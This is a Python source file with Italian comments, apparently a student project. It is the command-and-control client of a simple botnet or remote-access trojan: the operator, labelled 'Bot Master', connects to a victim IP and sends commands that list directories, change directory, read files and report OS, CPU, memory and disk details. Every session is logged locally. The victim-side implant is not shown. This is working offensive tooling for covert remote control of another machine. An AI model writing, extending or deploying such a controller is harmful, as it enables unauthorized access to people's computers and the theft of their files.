from audioop import add
from socket import *
from functions import *
from datetime import datetime

serverName = input("IP: ")
serverPort = 12000
clientSocket = socket(AF_INET, SOCK_STREAM)
clientSocket.connect((serverName,serverPort))
#Genera un report della sessione
report = open("./Log.txt","a")
ct = datetime.now().strftime("%d-%m-%Y")
report.write(ct + "\n")
ct = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
report.write("[" + ct + "] Connesso\n")
print("Connesso\n")
while True:
    com = input ("\nInserire un comando (\"help\" per la lista dei comandi): ")
    comando = "x"
    if com == "os":
        comando = "1"
        ct = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        report.write("[" + ct + "] \"Bot Master\" os\n")
    #Elenca i file e le cartelle presenti nella working directory
    elif com == "ls":
        comando = "2"
        ct = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        report.write("[" + ct + "] \"Bot Master\" ls\n")
    #Cambia directory inserendo la directory destinazione dopo cd (cd directory)
    elif com[0:3] == "cd ":
        comando = "3" + com[2:]
        ct = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        report.write("[" + ct + "] \"Bot Master\" " + com + "\n")
    #Visualizza la current working directory
    elif com == "pwd":
        comando = "4"
        ct = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        report.write("[" + ct + "] \"Bot Master\" pwd\n")
    #Visualizza info sulla cpu
    elif com == "cpu":
        comando = "5"
        ct = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        report.write("[" + ct + "] \"Bot Master\" cpu\n")
    #Visualizza info sulla RAM
    elif com == "memory":
        comando = "6"
        ct = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        report.write("[" + ct + "] \"Bot Master\" memory\n")
    #Visualizza info sui dischi/memorie di massa (numero e capienza, sia totale che utilizzata che libera)
    elif com == "disk":
        comando = "7"
        ct = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        report.write("[" + ct + "] \"Bot Master\" disk\n")
    #Legge un file presente nella working directory
    elif com[0:5] == "read ":
        file = com[5:]
        comando = "8" + file
        ct = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        report.write("[" + ct + "] \"Bot Master\" " + com + "\n")
    elif com == "system":
        comando = "9"
        ct = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        report.write("[" + ct + "] \"Bot Master\" " + com + "\n")
    #Visualizza la lista dei comandi
    elif com == "help":
        cmd_list()
        continue
    #Chiude la connessione
    elif com == "exit":
        comando = "exit"
        ct = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        report.write("[" + ct + "] \"Bot Master\" exit\n")
    else:
        print("Comando non riconosciuto\n")
        continue
    clientSocket.send(comando.encode())
    if comando == "exit":
        print ("Connessione terminata")
        ct = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
        report.write("[" + ct + "] Disconnesso\n\n")
        report.close()
        break
    messaggio = clientSocket.recv(102400).decode()
    print ("\n" + messaggio + "\n")
    ct = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
    report.write("[" + ct + "] \"Applicazione Interessante\"\n" + messaggio + "\n")
clientSocket.close()